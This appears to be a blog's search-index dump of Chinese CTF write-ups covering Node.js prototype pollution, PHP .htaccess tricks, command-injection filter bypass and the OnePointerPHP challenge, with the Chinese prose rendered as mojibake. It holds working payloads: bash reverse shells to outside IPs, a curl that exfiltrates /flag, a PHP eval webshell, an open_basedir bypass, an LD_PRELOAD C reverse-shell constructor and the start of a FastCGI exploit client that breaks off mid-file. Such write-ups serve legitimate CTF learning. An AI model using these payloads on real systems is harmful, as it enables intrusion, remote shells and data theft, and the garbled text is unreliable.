raw);&#125; å‘ç°æœ‰è¿™ä¹ˆä¸¤å¤„ï¼Œè·Ÿè¸ªget_note 123456789101112app.route(&#x27;/notes&#x27;) .get(function(req, res) &#123; let q = req.query.q; let a_note; if (typeof(q) === &quot;undefined&quot;) &#123; a_note = notes.get_all_notes(); &#125; else &#123; a_note = notes.get_note(q); &#125; res.render(&#x27;note&#x27;, &#123;list: a_note&#125;); &#125;) æˆ‘ä»¬å¯ä»¥å‘ç°å®Œå…¨æ˜¯ä¸å¯æ§çš„ï¼Œå› ä¸ºæˆ‘ä»¬çš„å‚æ•°æ²¡æœ‰åŠæ³•ä¼ è¿›å»ï¼Œå›å»çœ‹å¦å¤–ä¸€ä¸ª 12345678910111213141516app.route(&#x27;/edit_note&#x27;) .get(function(req, res) &#123; res.render(&#x27;mess&#x27;, &#123;message: &quot;please use POST to edit a note&quot;&#125;); &#125;) .post(function(req, res) &#123; let id = req.body.id; let author = req.body.author; let enote = req.body.raw; if (id &amp;&amp; author &amp;&amp; enote) &#123; notes.edit_note(id, author, enote); res.render(&#x27;mess&#x27;, &#123;message: &quot;edit note sucess&quot;&#125;); &#125; else &#123; res.render(&#x27;mess&#x27;, &#123;message: &quot;edit note failed&quot;&#125;); &#125; &#125;) å‘ç°ä¼šå°†æˆ‘ä»¬çš„å‚æ•°æ¥æ”¶ï¼Œå¹¶ä¸”ç›´æ¥è°ƒç”¨äº†è¯¥å‡½æ•° 1notes.edit_note(id, author, enote); é‚£æˆ‘ä»¬ç›´æ¥TM 1id&#x3D;__proto__&amp;author&#x3D;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;81.69.201.65&#x2F;9001 0&gt;&amp;1 è¢«æ‹¼æ¥ä¸Šä¹‹åæ‰§è¡Œäº† 1undefsafe(this.note_list, __prott + &#39;.author&#39;,&#39;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.146.129&#x2F;2333 0&gt;&amp;1&#39;); è¿™ç§æƒ…å†µä¸‹å°±æ±¡æŸ“æˆåŠŸäº†ï¼Œå›åˆ°statusè·¯å¾„ä¸‹å³å¯æ‰§è¡Œå‘½ä»¤ æ ¹æ®ä»£ç è¿˜éœ€è¦ä¼ ä¸€ä¸ªrawï¼Œéšä¾¿ä¼ ä¸€ä¸ªä¸œè¥¿å°±è¡Œï¼Œä¸å¹²æ‰°æˆ‘ä»¬ æˆ‘è¿™å‡ å¤©BUUåå¼¹shellå‡ºå»å°±æ²¡æˆåŠŸè¿‡ï¼Œæ‰€ä»¥å°è¯•å¤–å¸¦æ•°æ®è¿‡å»äº† 1id&#x3D;__proto__&amp;author&#x3D;curl http:&#x2F;&#x2F;IP:PORT&#x2F;?data&#x3D;$(cat &#x2F;flag)&amp;raw&#x3D;ysllz å¾—åˆ°flag","categories":[],"tags":[{"name":"åŸå‹é“¾æ±¡æŸ“","slug":"åŸå‹é“¾æ±¡æŸ“","permalink":"http://example.com/tags/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/"},{"name":"JavaScript","slug":"JavaScript","permalink":"http://example.com/tags/JavaScript/"}]},{"title":"XNUCA2019QualifierEasyPHP","slug":"XNUCA2019QualifierEasyPHP","date":"2021-05-12T13:02:05.000Z","updated":"2021-05-13T03:41:12.962Z","comments":true,"path":"2021/05/12/XNUCA2019QualifierEasyPHP/","link":"","permalink":"http://example.com/2021/05/12/XNUCA2019QualifierEasyPHP/","excerpt":"","text":"çŸ¥è¯†ç‚¹ï¼šå…ˆæ¥çœ‹çœ‹php.iniå’Œ.htaccessçš„åŒºåˆ« 1https:&#x2F;&#x2F;www.orcode.com&#x2F;question&#x2F;483978_kadb02.html ä¹Ÿå³æ˜¯æˆ‘ä»¬ä¸Šä¼ ä¸€ä¸ªå¯ä»¥å½±å“æˆ‘ä»¬è‡ªå·±ã€‚ä½†æ˜¯.htaccessä¹Ÿåªä¸è¿‡æ˜¯apache2é…ç½®ä¸­çš„ä¸€ä¸ªæ¨¡å—ï¼Œphp.iniä¸­çš„é…ç½®æ˜¯éš¶å±äºapache.confå½“ä¸­çš„ æ•…æˆ‘ä»¬æƒ³è¦ä¿®æ”¹ä»€ä¹ˆçš„è¯ç›´æ¥çœ‹ 1https:&#x2F;&#x2F;www.php.net&#x2F;manual&#x2F;zh&#x2F;ini.list.php htaccessç”Ÿæ•ˆ å¦‚æœå°è¯•ä¸Šä¼ htaccessæ–‡ä»¶ä¼šå‘ç°å‡ºç°å“åº”500çš„é—®é¢˜ï¼Œå› ä¸ºæ–‡ä»¶å°¾æœ‰Just one chance è¿™é‡Œé‡‡ç”¨# \\çš„æ–¹å¼å°†æ¢è¡Œç¬¦è½¬ä¹‰æˆæ™®é€šå­—ç¬¦ï¼Œå°±å¯ä»¥ç”¨#æ¥æ³¨é‡Šå•è¡Œäº†ã€‚ æ€è·¯æ­£è§£é¢˜ç›®æ˜¯æ”¾å‡ºæºç çš„ï¼š 12345678910111213141516171819202122232425262728293031323334&lt;?php $files = scandir(&#x27;./&#x27;); foreach($files as $file) &#123; if(is_file($file))&#123; if ($file !== &quot;index.php&quot;) &#123; unlink($file); &#125; &#125; &#125; include_once(&quot;fl3g.php&quot;); if(!isset($_GET[&#x27;content&#x27;]) || !isset($_GET[&#x27;filename&#x27;])) &#123; highlight_file(__FILE__); die(); &#125; $content = $_GET[&#x27;content&#x27;]; if(stristr($content,&#x27;on&#x27;) || stristr($content,&#x27;html&#x27;) || stristr($content,&#x27;type&#x27;) || stristr($content,&#x27;flag&#x27;) || stristr($content,&#x27;upload&#x27;) || stristr($content,&#x27;file&#x27;)) &#123; echo &quot;Hacker&quot;; die(); &#125; $filename = $_GET[&#x27;filename&#x27;]; if(preg_match(&quot;/[^a-z\\.]/&quot;, $filename) == 1) &#123; echo &quot;Hacker&quot;; die(); &#125; $files = scandir(&#x27;./&#x27;); foreach($files as $file) &#123; if(is_file($file))&#123; if ($file !== &quot;index.php&quot;) &#123; unlink($file); &#125; &#125; &#125; file_put_contents($filename, $content . &quot;\\nJust one chance&quot;);?&gt; è€Œæˆ‘ä»¬çŸ¥é“åŒ…å«äº†f13g.phpï¼Œ ç”±äºæ¯æ¬¡è®¿é—®éƒ½ä¼šåˆ é™¤æˆ‘ä»¬çš„æ–‡ä»¶ï¼Œæ‰€ä»¥æˆ‘ä»¬å…¶å®ä¸èƒ½ç›´æ¥å†™å…¥f13g.phpï¼Œé‚£ä¹ˆæˆ‘ä»¬æƒ³æƒ³è¿˜æœ‰ä»€ä¹ˆå¯ä»¥åšï¼Ÿ æ ¹æ®å¸ˆå‚…çš„WPï¼Œæˆ‘ä»¬å¯ä»¥åœ¨php.iniçš„é…ç½®ä¸­æ‰¾åˆ° 1https:&#x2F;&#x2F;www.php.net&#x2F;manual&#x2F;zh&#x2F;ini.core.php#ini.include-path çœ‹ä¸‹ç¿»è¯‘ æ„æ€æ˜¯ä¿®æ”¹ä¹‹åå½“æˆ‘ä»¬è¿›è¡Œincludeçš„æ“ä½œæ—¶ï¼Œä¼šä¼˜å…ˆçœ‹æˆ‘ä»¬æŒ‡å®šçš„é…ç½®è·¯å¾„ï¼Œä¹‹åå†å›æ¥ å¯æ˜¯è¿™åˆæœ‰ä»€ä¹ˆç”¨å‘¢ï¼Œæˆ‘ä»¬æ€ä¹ˆåŠå»æ§åˆ¶å†™å…¥çš„è·¯å¾„æ–‡ä»¶å‘¢ å’‹éƒ½å¤ç°ä¸å‡ºæ¥ï¼Œç©å°¼ç› 1https:&#x2F;&#x2F;www.cnblogs.com&#x2F;20175211lyz&#x2F;p&#x2F;11740901.html#1%E3%80%81error_log%E7%BB%93%E5%90%88log_errors%E8%87%AA%E5%AE%9A%E4%B9%89%E9%94%99%E8%AF%AF%E6%97%A5%E5%BF%97 éšä¾¿æ‰¾ä¸ªåœ°æ–¹æ”¾ä¸€ä¸‹ 12 python2 -m SimpleHTTPServer 8001python3 -m http.server","categories":[],"tags":[{"name":"PHP","slug":"PHP","permalink":"http://example.com/tags/PHP/"},{"name":"æ–‡ä»¶ä¸Šä¼ ","slug":"æ–‡ä»¶ä¸Šä¼ ","permalink":"http://example.com/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"},{"name":"PHP.INI","slug":"PHP-INI","permalink":"http://example.com/tags/PHP-INI/"}]},{"title":"BUUCTF_EasyByPass","slug":"BUUCTF-EasyByPass","date":"2021-05-12T12:19:19.000Z","updated":"2021-05-12T12:22:24.690Z","comments":true,"path":"2021/05/12/BUUCTF-EasyByPass/","link":"","permalink":"http://example.com/2021/05/12/BUUCTF-EasyByPass/","excerpt":"","text":"çŸ¥è¯†ç‚¹é—­åˆæ‹¬å· é¢˜ç›®æ”¾å‡ºæºç ï¼š 123456789101112131415161718192021222324&lt;?phphighlight_file(__FILE__);$comm1 = $_GET[&#x27;comm1&#x27;];$comm2 = $_GET[&#x27;comm2&#x27;];if(preg_match(&quot;/\\&#x27;|\\`|\\\\|\\*|\\n|\\t|\\xA0|\\r|\\&#123;|\\&#125;|\\(|\\)|&lt;|\\&amp;[^\\d]|@|\\||tail|bin|less|more|string|nl|pwd|cat|sh|flag|find|ls|grep|echo|w/is&quot;, $comm1)) $comm1 = &quot;&quot;;if(preg_match(&quot;/\\&#x27;|\\&quot;|;|,|\\`|\\*|\\\\|\\n|\\t|\\r|\\xA0|\\&#123;|\\&#125;|\\(|\\)|&lt;|\\&amp;[^\\d]|@|\\||ls|\\||tail|more|cat|string|bin|less||tac|sh|flag|find|grep|echo|w/is&quot;, $comm2)) $comm2 = &quot;&quot;;$flag = &quot;#flag in /flag&quot;;$comm1 = &#x27;&quot;&#x27; . $comm1 . &#x27;&quot;&#x27;;$comm2 = &#x27;&quot;&#x27; . $comm2 . &#x27;&quot;&#x27;;var_dump($comm1);echo &quot;&lt;br&gt;&quot;;$cmd = &quot;file $comm1 $comm2&quot;;var_dump($cmd);system($cmd);?&gt; æœ¬åœ°æµ‹è¯•ä¸€ä¸‹ï¼Œéšä¾¿æµ‹äº†ä¸€ä¸‹ã€‚ã€‚æ‰“ï¼Œè¿‡äº† 1http:&#x2F;&#x2F;192.168.32.131&#x2F;1.php?comm1&#x3D;&quot;;tac &#x2F;*;&quot;&amp;comm2&#x3D;1","categories":[],"tags":[{"name":"PHP","slug":"PHP","permalink":"http://example.com/tags/PHP/"},{"name":"å‘½ä»¤æ‰§è¡Œ","slug":"å‘½ä»¤æ‰§è¡Œ","permalink":"http://example.com/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"}]},{"title":"OnePointerPHP","slug":"OnePointerPHP","date":"2021-05-12T07:59:04.000Z","updated":"2021-05-12T10:09:34.586Z","comments":true,"path":"2021/05/12/OnePointerPHP/","link":"","permalink":"http://example.com/2021/05/12/OnePointerPHP/","excerpt":"","text":"12345678910111213141516&lt;?phpinclude &quot;user.php&quot;;if($user=unserialize($_COOKIE[&quot;data&quot;]))&#123; $count[++$user-&gt;count]=1; if($count[]=1)&#123; $user-&gt;count+=1; setcookie(&quot;data&quot;,serialize($user)); &#125;else&#123; eval($_GET[&quot;backdoor&quot;]); &#125;&#125;else&#123; $user=new User; $user-&gt;count=1; setcookie(&quot;data&quot;,serialize($user));&#125;?&gt; PHPçš„æ•´æ•°å‹æ˜¯æœ‰ä¸Šé™çš„ï¼Œæ ¹æ®å¤§ä½¬çš„åšå®¢ï¼š åœ¨ PHP ä¸­ï¼Œæ•´å‹æ•°æ˜¯æœ‰ä¸€ä¸ªèŒƒå›´çš„ï¼Œå¯¹äº32ä½çš„æ“ä½œç³»ç»Ÿï¼Œæœ€å¤§çš„æ•´å‹æ˜¯2147483647ï¼Œå³2çš„31æ¬¡æ–¹ï¼Œæœ€å°ä¸º-2çš„31æ¬¡æ–¹ã€‚å¦‚æœç»™å®šçš„ä¸€ä¸ªæ•´æ•°è¶…å‡ºäº†æ•´å‹ï¼ˆintegerï¼‰çš„èŒƒå›´ï¼Œå°†ä¼šè¢«è§£é‡Šä¸ºæµ®ç‚¹å‹ï¼ˆfloatï¼‰ã€‚åŒæ ·å¦‚æœæ‰§è¡Œçš„è¿ç®—ç»“æœè¶…å‡ºäº†æ•´å‹ï¼ˆintegerï¼‰èŒƒå›´ï¼Œä¹Ÿä¼šè¿”å›æµ®ç‚¹å‹ï¼ˆfloatï¼‰ã€‚ æˆ‘ä»¬æ¥å¤ç°ä¸€ä¸‹ï¼š 1234567891011&lt;?php$a = 123445566;$b = 9223372036854775807;$c = 9223372036854775808;$d = 50000000000000 * 1000000;var_dump($a);var_dump($b);var_dump($c);var_dump($d); æˆ‘ä»¬ä¸éš¾å‘ç°è·³è½¬ä»5807-&gt;5808çš„æ—¶å€™å˜æˆäº†doubleç±»å‹ã€‚ è¿™ä¹Ÿå°±è¯´æ˜å½“è¶…è¿‡çš„æ—¶å€™ä¼šå­˜åœ¨ä¸€æ¬¡éšå½¢çš„æ•°æ®è½¬æ¢ï¼Œè€Œæ•°ç»„åœ¨åˆ›å»ºçš„æ—¶å€™å·²ç»å°†å†…å­˜å®šä¸‹æ¥äº†ï¼ˆç›²çŒœï¼‰ 1234$userconut = 9223372036854775806;$count[++$userconut] = 1;$count[] = 1;print_r($count); æ‰€ä»¥è¿™æ®µæ—¶é—´ä¼šæŠ¥é”™ï¼Œåˆ©ç”¨è¿™ä¸ªç»•è¿‡æŠ¥é”™ã€‚ å†™å…¥æ–‡ä»¶ï¼š 1file_put_contents(&quot;1.php&quot;,&quot;&lt;%3fphp+eval(\\$_POST[1])%3b%3f&gt;&quot;)%3b ç”¨èšå‰‘ğŸ”—ä¸Šå»ï¼Œå‘ç°è¢«basedir é™åˆ¶äº†ï¼Œç»•è¿‡çš„è¯éœ€è¦ï¼š 12345678 &lt;?phpmkdir(&#x27;mayi&#x27;);chdir(&#x27;mayi&#x27;);ini_set(&#x27;open_basedir&#x27;,&#x27;..&#x27;);chdir(&#x27;..&#x27;);chdir(&#x27;..&#x27;);chdir(&#x27;..&#x27;);chdir(&#x27;..&#x27;);chdir(&#x27;..&#x27;);chdir(&#x27;..&#x27;);chdir(&#x27;..&#x27;);ini_set(&#x27;open_basedir&#x27;,&#x27;/&#x27;);var_dump(file_get_contents($_GET[&#x27;file&#x27;])); æ–‡ç« è§£é‡Šï¼š 1https:&#x2F;&#x2F;www.cnblogs.com&#x2F;LLeaves&#x2F;p&#x2F;13210005.html ä¸ºäº†å›¾æ–¹ä¾¿æˆ‘ç›´æ¥å†™åœ¨äº†1.phpé‡Œé¢ 1https:&#x2F;&#x2F;mayi077.gitee.io&#x2F;2021&#x2F;05&#x2F;04&#x2F;%E8%93%9D%E5%B8%BD%E6%9D%AF-One-Pointer-PHP&#x2F; 123456789 &lt;?phpmkdir(&#x27;mayi&#x27;);chdir(&#x27;mayi&#x27;);ini_set(&#x27;open_basedir&#x27;,&#x27;..&#x27;);chdir(&#x27;..&#x27;);chdir(&#x27;..&#x27;);chdir(&#x27;..&#x27;);chdir(&#x27;..&#x27;);chdir(&#x27;..&#x27;);chdir(&#x27;..&#x27;);chdir(&#x27;..&#x27;);ini_set(&#x27;open_basedir&#x27;,&#x27;/&#x27;);var_dump(file_get_contents($_GET[&#x27;file&#x27;]));eval($_POST[0]); é¢„æœŸ éé¢„æœŸè¿™æ—¶å€™æƒ³è¦è¯»flagç»“æœå‘ç°æ— æ³•è¯»å–ã€‚å›åˆ°phpinfoå½“ä¸­ï¼Œæˆ‘ä»¬å‘ç°æˆ‘ä»¬æ˜¯æœ‰fpmçš„ã€‚ è€Œphpæ˜¯å¯ä»¥ç”¨è¿™ä¸ªè¿›è¡Œææƒçš„ã€‚æ¥ä¸‹æ¥æˆ‘ä»¬éœ€è¦æ‰¾fpmçš„é…ç½®æ–‡ä»¶ è¯»å–æ–‡ä»¶ /proc/self/cmdline 1http:&#x2F;&#x2F;91eedfff-1313-4748-954f-100343ceda6d.node3.buuoj.cn&#x2F;2.php?file&#x3D;&#x2F;proc&#x2F;self&#x2F;cmdline æ²¡æœ‰å¾—åˆ°æˆ‘ä»¬éœ€è¦çš„ä¸œè¥¿0 0 è€Œselfçš„æ„ä¹‰æ˜¯ï¼š æˆ‘ä»¬éƒ½çŸ¥é“å¯ä»¥é€šè¿‡/proc/$pid/æ¥è·å–æŒ‡å®šè¿›ç¨‹çš„ä¿¡æ¯ï¼Œä¾‹å¦‚å†…å­˜æ˜ å°„ã€CPUç»‘å®šä¿¡æ¯ç­‰ç­‰ã€‚å¦‚æœæŸä¸ªè¿›ç¨‹æƒ³è¦è·å–æœ¬è¿›ç¨‹çš„ç³»ç»Ÿä¿¡æ¯ï¼Œå°±å¯ä»¥é€šè¿‡è¿›ç¨‹çš„pidæ¥è®¿é—®/proc/$pid/ç›®å½•ã€‚ä½†æ˜¯è¿™ä¸ªæ–¹æ³•è¿˜éœ€è¦è·å–è¿›ç¨‹pidï¼Œåœ¨forkã€daemonç­‰æƒ…å†µä¸‹pidè¿˜å¯èƒ½å‘ç”Ÿå˜åŒ–ã€‚ä¸ºäº†æ›´æ–¹ä¾¿çš„è·å–æœ¬è¿›ç¨‹çš„ä¿¡æ¯ï¼Œlinuxæä¾›äº†/proc/self/ç›®å½•ï¼Œè¿™ä¸ªç›®å½•æ¯”è¾ƒç‹¬ç‰¹ï¼Œä¸åŒçš„è¿›ç¨‹è®¿é—®è¯¥ç›®å½•æ—¶è·å¾—çš„ä¿¡æ¯æ˜¯ä¸åŒçš„ï¼Œå†…å®¹ç­‰ä»·äº/proc/æœ¬è¿›ç¨‹pid/ã€‚è¿›ç¨‹å¯ä»¥é€šè¿‡è®¿é—®/proc/self/ç›®å½•æ¥è·å–è‡ªå·±çš„ç³»ç»Ÿä¿¡æ¯ï¼Œè€Œä¸ç”¨æ¯æ¬¡éƒ½è·å–pidã€‚ ä½†æ˜¯å¾ˆæ˜¾ç„¶çš„å¯åŠ¨FPMæœåŠ¡ä¸æ˜¯æœ¬è¿›ç¨‹ï¼Œæˆ‘ä»¬ç”¨burpçˆ†ç ´ä¸€ä¸‹è¿›ç¨‹ å¾—åˆ°37ï¼Œæˆ‘ä»¬å†å»è¯»å–è¯¥æ–‡ä»¶æ¥æ‰¾åˆ°fpmçš„å¼€æ”¾ç«¯å£ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146 string(5346) &quot;;;;;;;;;;;;;;;;;;;;;;; FPM Configuration ;;;;;;;;;;;;;;;;;;;;;;; All relative paths in this configuration file are relative to PHP&#x27;s install; prefix (/usr/local). This prefix can be dynamically changed by using the; &#x27;-p&#x27; argument from the command line.;;;;;;;;;;;;;;;;;;; Global Options ;;;;;;;;;;;;;;;;;;;[global]; Pid file; Note: the default prefix is /usr/local/var; Default Value: none;pid = run/php-fpm.pid; Error log file; If it&#x27;s set to &quot;syslog&quot;, log is sent to syslogd instead of being written; into a local file.; Note: the default prefix is /usr/local/var; Default Value: log/php-fpm.log;error_log = log/php-fpm.log; syslog_facility is used to specify what type of program is logging the; message. This lets syslogd specify that messages from different facilities; will be handled differently.; See syslog(3) for possible values (ex daemon equiv LOG_DAEMON); Default Value: daemon;syslog.facility = daemon; syslog_ident is prepended to every message. If you have multiple FPM; instances running on the same server, you can change the default value; which must suit common needs.; Default Value: php-fpm;syslog.ident = php-fpm; Log level; Possible Values: alert, error, warning, notice, debug; Default Value: notice;log_level = notice; Log limit on number of characters in the single line (log entry). If the; line is over the limit, it is wrapped on multiple lines. The limit is for; all logged characters including message prefix and suffix if present. However; the new line character does not count into it as it is present only when; logging to a file descriptor. It means the new line character is not present; when logging to syslog.; Default Value: 1024;log_limit = 4096; Log buffering specifies if the log line is buffered which means that the; line is written in a single write operation. If the value is false, then the; data is written directly into the file descriptor. It is an experimental; option that can potentionaly improve logging performance and memory usage; for some heavy logging scenarios. This option is ignored if logging to syslog; as it has to be always buffered.; Default value: yes;log_buffering = no; If this number of child processes exit with SIGSEGV or SIGBUS within the time; interval set by emergency_restart_interval then FPM will restart. A value; of &#x27;0&#x27; means &#x27;Off&#x27;.; Default Value: 0;emergency_restart_threshold = 0; Interval of time used by emergency_restart_interval to determine when; a graceful restart will be initiated. This can be useful to work around; accidental corruptions in an accelerator&#x27;s shared memory.; Available Units: s(econds), m(inutes), h(ours), or d(ays); Default Unit: seconds; Default Value: 0;emergency_restart_interval = 0; Time limit for child processes to wait for a reaction on signals from master.; Available units: s(econds), m(inutes), h(ours), or d(ays); Default Unit: seconds; Default Value: 0;process_control_timeout = 0; The maximum number of processes FPM will fork. This has been designed to control; the global number of processes when using dynamic PM within a lot of pools.; Use it with caution.; Note: A value of 0 indicates no limit; Default Value: 0; process.max = 128; Specify the nice(2) priority to apply to the master process (only if set); The value can vary from -19 (highest priority) to 20 (lowest priority); Note: - It will only work if the FPM master process is launched as root; - The pool process will inherit the master process priority; unless specified otherwise; Default Value: no set; process.priority = -19; Send FPM to background. Set to &#x27;no&#x27; to keep FPM in foreground for debugging.; Default Value: yes;daemonize = yes; Set open file descriptor rlimit for the master process.; Default Value: system defined value;rlimit_files = 1024; Set max core size rlimit for the master process.; Possible Values: &#x27;unlimited&#x27; or an integer greater or equal to 0; Default Value: system defined value;rlimit_core = 0; Specify the event mechanism FPM will use. The following is available:; - select (any POSIX os); - poll (any POSIX os); - epoll (linux &gt;= 2.5.44); - kqueue (FreeBSD &gt;= 4.1, OpenBSD &gt;= 2.9, NetBSD &gt;= 2.0); - /dev/poll (Solaris &gt;= 7); - port (Solaris &gt;= 10); Default Value: not set (auto detection);events.mechanism = epoll; When FPM is built with systemd integration, specify the interval,; in seconds, between health report notification to systemd.; Set to 0 to disable.; Available Units: s(econds), m(inutes), h(ours); Default Unit: seconds; Default value: 10;systemd_interval = 10;;;;;;;;;;;;;;;;;;;;; Pool Definitions ;;;;;;;;;;;;;;;;;;;;;; Multiple pools of child processes may be started with different listening; ports and different management options. The name of the pool will be; used in logs and stats. There is no limitation on the number of pools which; FPM can handle. Your system will tell you anyway :); Include one or more files. If glob(3) exists, it is used to include a bunch of; files from a glob(3) pattern. This directive can be used everywhere in the; file.; Relative path can also be used. They will be prefixed by:; - the global prefix if it&#x27;s been set (-p argument); - /usr/local otherwiseinclude=etc/php-fpm.d/*.conf&quot; å‘ç°å¹¶æ²¡æœ‰æˆ‘ä»¬éœ€è¦çš„ä¸œè¥¿ã€‚ã€‚æ²¡æœ‰æ‰¾åˆ°ç«¯å£ï¼Œä½†æ˜¯å®ƒåŒ…å«äº†å¦å¤–ä¸€ä¸ªconfï¼Œæˆ‘ä»¬å†å»æ‰«ä¸€å“ˆ 1include&#x3D;etc&#x2F;php-fpm.d&#x2F;*.conf è‰ï¼Œå‚»äº†,ç™¾åº¦çš„æ—¶å€™è¯´æ˜¯ç”¨www.confçš„ï¼Œç»“æœæˆ‘å½“æ—¶è·¯å¾„å†™é”™äº†ï¼Œï¼Œ 10&#x3D;var_dump(scandir(&#39;&#x2F;usr&#x2F;local&#x2F;etc&#x2F;php-fpm.d&#39;)); è¿™æ ·æ‰«ç›®å½•çš„è¯ä¹Ÿèƒ½å¾—åˆ° 1234567891011121314group = www-data; The address on which to accept FastCGI requests.; Valid syntaxes are:; &#x27;ip.add.re.ss:port&#x27; - to listen on a TCP socket to a specific IPv4 address on; a specific port;; &#x27;[ip:6:addr:ess]:port&#x27; - to listen on a TCP socket to a specific IPv6 address on; a specific port;; &#x27;port&#x27; - to listen on a TCP socket to all addresses; (IPv6 and IPv4-mapped) on a specific port;; &#x27;/path/to/unix/socket&#x27; - to listen on a unix socket.; Note: This value is mandatory.listen = 127.0.0.1:9001 å‘ç°æŠŠç«¯å£å¼€åœ¨äº†9001 å†ä¹‹åï¼Œå™”å™”å’šï¼Œéœ€è¦åˆ©ç”¨è¯¥æ“ä½œææƒï¼Œè¿™é‡Œå®Œå…¨ä¸æ‡‚å°±åªèƒ½è·Ÿç€å¤ç°äº†ï¼Œåªèƒ½è¯´Pç‰›å¤ªå¼ºå•¦ 12https:&#x2F;&#x2F;gist.github.com&#x2F;phith0n&#x2F;9615e2420f31048f7e30f3937356cf75 EXPåœ°å€https:&#x2F;&#x2F;www.leavesongs.com&#x2F;penetration&#x2F;fastcgi-and-php-fpm.html Pç‰›çš„è®²è§£ Fastcgiåè®®åˆ†æ &amp;&amp; PHP-FPMæœªæˆæƒè®¿é—®æ¼æ´ &amp;&amp; Expç¼–å†™ (Author: phithon) æ‹“å±•ï¼š 12345678#define _GNU_SOURCE#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt;__attribute__ ((__constructor__)) void preload (void)&#123; system(&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/47.97.123.81/11451 0&gt;&amp;1&#x27;&quot;);&#125; ç”Ÿæˆpayloadçš„ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350&lt;?php/** * Note : Code is released under the GNU LGPL * * Please do not change the header of this file * * This library is free software; you can redistribute it and/or modify it under the terms of the GNU * Lesser General Public License as published by the Free Software Foundation; either version 2 of * the License, or (at your option) any later version. * * This library is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY; * without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. * * See the GNU Lesser General Public License for more details. *//** * Handles communication with a FastCGI application * * @author Pierrick Charron &lt;pierrick@webstart.fr&gt; * @version 1.0 */class FCGIClient&#123; const VERSION_1 = 1; const BEGIN_REQUEST = 1; const ABORT_REQUEST = 2; const END_REQUEST = 3; const PARAMS = 4; const STDIN = 5; const STDOUT = 6; const STDERR = 7; const DATA = 8; const GET_VALUES = 9; const GET_VALUES_RESULT = 10; const UNKNOWN_TYPE = 11; const MAXTYPE = self::UNKNOWN_TYPE; const RESPONDER = 1; const AUTHORIZER = 2; const FILTER = 3; const REQUEST_COMPLETE = 0; const CANT_MPX_CONN = 1; const OVERLOADED = 2; const UNKNOWN_ROLE = 3; const MAX_CONNS = &#x27;MAX_CONNS&#x27;; const MAX_REQS = &#x27;MAX_REQS&#x27;; const MPXS_CONNS = &#x27;MPXS_CONNS&#x27;; const HEADER_LEN = 8; /** * Socket * @var Resource */ private $_sock = null; /** * Host * @var String */ private $_host = null; /** * Port * @var Integer */ private $_port = null; /** * Keep Alive * @var Boolean */ private $_keepAlive = false; /** * Constructor * * @param String $host Host of the FastCGI application * @param Integer $port Port of the FastCGI application */ public function __construct($host, $port = 9001) // and default value for port, just for unixdomain socket &#123; $this-&gt;_host = $host; $this-&gt;_port = $port; &#125; /** * Define whether or not the FastCGI application should keep the connection * alive at the end of a request * * @param Boolean $b true if the connection should stay alive, false otherwise */ public function setKeepAlive($b) &#123; $this-&gt;_keepAlive = (boolean)$b; if (!$this-&gt;_keepAlive &amp;&amp; $this-&gt;_sock) &#123; fclose($this-&gt;_sock); &#125; &#125; /** * Get the keep alive status * * @return Boolean true if the connection should stay alive, false otherwise */ public function getKeepAlive() &#123; return $this-&gt;_keepAlive; &#125; /** * Create a connection to the FastCGI application */ private function connect() &#123; if (!$this-&gt;_sock) &#123; //$this-&gt;_sock = fsockopen($this-&gt;_host, $this-&gt;_port, $errno, $errstr, 5); $this-&gt;_sock = stream_socket_client($this-&gt;_host, $errno, $errstr, 5); if (!$this-&gt;_sock) &#123; throw new Exception(&#x27;Unable to connect to FastCGI application&#x27;); &#125; &#125; &#125; /** * Build a FastCGI packet * * @param Integer $type Type of the packet * @param String $content Content of the packet * @param Integer $requestId RequestId */ private function buildPacket($type, $content, $requestId = 1) &#123; $clen = strlen($content); return chr(self::VERSION_1) /* version */ . chr($type) /* type */ . chr(($requestId &gt;&gt; 8) &amp; 0xFF) /* requestIdB1 */ . chr($requestId &amp; 0xFF) /* requestIdB0 */ . chr(($clen &gt;&gt; 8 ) &amp; 0xFF) /* contentLengthB1 */ . chr($clen &amp; 0xFF) /* contentLengthB0 */ . chr(0) /* paddingLength */ . chr(0) /* reserved */ . $content; /* content */ &#125; /** * Build an FastCGI Name value pair * * @param String $name Name * @param String $value Value * @return String FastCGI Name value pair */ private function buildNvpair($name, $value) &#123; $nlen = strlen($name); $vlen = strlen($value); if ($nlen &lt; 128) &#123; /* nameLengthB0 */ $nvpair = chr($nlen); &#125; else &#123; /* nameLengthB3 &amp; nameLengthB2 &amp; nameLengthB1 &amp; nameLengthB0 */ $nvpair = chr(($nlen &gt;&gt; 24) | 0x80) . chr(($nlen &gt;&gt; 16) &amp; 0xFF) . chr(($nlen &gt;&gt; 8) &amp; 0xFF) . chr($nlen &amp; 0xFF); &#125; if ($vlen &lt; 128) &#123; /* valueLengthB0 */ $nvpair .= chr($vlen); &#125; else &#123; /* valueLengthB3 &amp; valueLengthB2 &amp; valueLengthB1 &amp; valueLengthB0 */ $nvpair .= chr(($vlen &gt;&gt; 24) | 0x80) . chr(($vlen &gt;&gt; 16) &amp; 0xFF) . chr(($vlen &gt;&gt; 8) &amp; 0xFF) . chr($vlen &amp; 0xFF); &#125; /* nameData &amp; valueData */ return $nvpair . $name . $value; &#125; /** * Read a set of 